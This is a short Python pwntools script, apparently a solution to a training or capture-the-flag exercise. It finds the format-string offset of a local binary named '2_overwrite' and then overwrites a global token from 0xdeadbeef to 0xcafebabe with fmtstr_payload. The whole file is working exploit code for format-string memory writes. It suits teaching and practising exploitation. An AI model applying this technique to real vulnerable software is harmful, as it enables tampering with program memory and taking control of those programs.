#!/usr/bin/python

from pwn import * 

binary = "./2_overwrite" # Binary name

# unsigned int token = 0xdeadbeef;
# objdump -t 2_overwrite |grep token
# 0804a028 g     O .data  00000004              token
token_addr = 0x0804a028

def main():
	for i in range(1, 10): # From 1 to 10
		p = process(binary) # Starts the process

		str_input = "AAAA%" + str(i) + "$x" # "AAAA%1$X", "AAAA%2$x", ...
		
		log.warn("Loop %s" % str(i)) 
		p.sendline(str_input)	
		
		data = p.recvall() # Stores reply from program in a variable which is to be parsed later
		search_str = "41414141" # Search string

		for line in data.split("\n"): # Split by newlines
			if search_str in line: 
				# If search string is found in line, prints not only the search string,
				# but the AAAA as well
				result = line[ line.find(search_str) - 4 : ] 
				offset = i
	
				log.success("Found " + search_str + " at offset " + str(offset))
				print result			

	# Calls the program to overwrite 0xdeadbeef with 0xcafebabe
	overwrite_target(offset)


def overwrite_target(offset):
	p = process(binary) # Starts the process again
	payload = fmtstr_payload(offset, {token_addr: 0xcafebabe})

	p.sendline(payload) # Send payload
	log.warn("Payload sent: %s" %payload) 
	
	data = p.recvall() 
	win_msg = data[ data.find("Token") : ] # Only extracts sentences containing the word "Token"

	print win_msg 


if __name__ == "__main__":
	main()
